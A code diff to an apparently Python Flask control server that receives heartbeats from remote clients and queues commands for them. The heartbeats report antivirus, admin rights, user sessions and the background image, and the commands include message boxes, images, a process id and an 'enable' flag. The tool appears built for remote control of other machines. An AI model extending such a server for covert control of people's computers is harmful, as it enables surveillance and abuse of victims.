@@ -47,8 +47,7 @@ def heartbeat():
             "user_sessions": system_info.get('user_sessions', []),
             "has_password": system_info.get('has_password', False),
             "current_background_image": system_info.get('current_background_image', None),
-            "microphones": system_info.get('microphones', []), # New: Get microphone information
-            "audio_devices": system_info.get('audio_devices', []) # New: Get audio device information
+            "taskbar_autohide": system_info.get('taskbar_autohide', False)
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
         if system_info.get('current_background_image'):
@@ -72,11 +71,12 @@ def send_command():
     pid = data.get("pid", None) # Get pid, default to None
     image_type = data.get("image_type", "") # New: Get image_type, default empty string
     filters = data.get("filters", None) # New: Get filters, default None
+    enable = data.get("enable", False) # New: Get enable, default False
 
     if client_id and cmd:
         # Store all relevant command data including monitor_index and image
-        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters}
-        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}, Image Type: {image_type}, Filters: {filters}) received.")
+        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "enable": enable}
+        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}, Image Type: {image_type}, Filters: {filters}, Enable: {enable}) received.")
         return jsonify({"status": "success", "message": "Command received"}), 200
     print(f"Invalid command data received: {data}")
     return jsonify({"status": "error", "message": "Invalid command data"}), 400
